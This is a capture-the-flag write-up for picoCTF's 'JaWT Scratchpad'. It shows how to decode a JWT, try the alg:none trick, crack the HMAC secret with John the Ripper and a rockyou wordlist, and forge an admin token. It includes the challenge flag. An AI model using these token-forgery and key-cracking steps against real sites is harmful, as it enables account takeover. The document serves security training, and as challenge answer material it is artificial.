# **_JaWT Scratchpad_**
## Description
>Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or `http://jupiter.challenges.picoctf.org:63090`

## Solution
Login as `John` and grab the `JWT`
>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y

Decode it
```console
❯ echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9' | base64 -d
{"typ":"JWT","alg":"HS256"}%
❯ echo 'eyJ1c2VyIjoiam9obiJ9' | base64 -d
{"user":"john"}
```
I changed `alg` to `none`, to ignore the signature, and `user` to `admin` to login as admin
```console
❯ echo -n '{"typ":"JWT","alg":"none"}' | base64
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
❯ echo -n '{"user":"admin"}' | base64
eyJ1c2VyIjoiYWRtaW4ifQ==
```
Combine them into `JWT`, replace the cookie and refresh the page
However it doesn't work, looks like it requires a signature
Lets bruteforce the secret key used for signature with `John-The-Ripper`
```console
❯ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y" > hash
❯ john hash --wordlist=/usr/share/dict/rockyou.txt --format=HMAC-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:00 DONE (2022-07-17 15:08) 1.234g/s 9142Kp/s 9142Kc/s 9142KC/s ilovetitoelbambino..ilovejesus71
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Use [JWT.io](https://jwt.io/) to generate the token with the secret key `ilovepico`

![image](https://user-images.githubusercontent.com/70738420/179427184-8421a992-ea18-4152-8e24-303058daa533.png)

Replace the cookie with the `JWT` generated, refresh and get the flag
>picoCTF{jawt_was_just_what_you_thought_f859ab2f}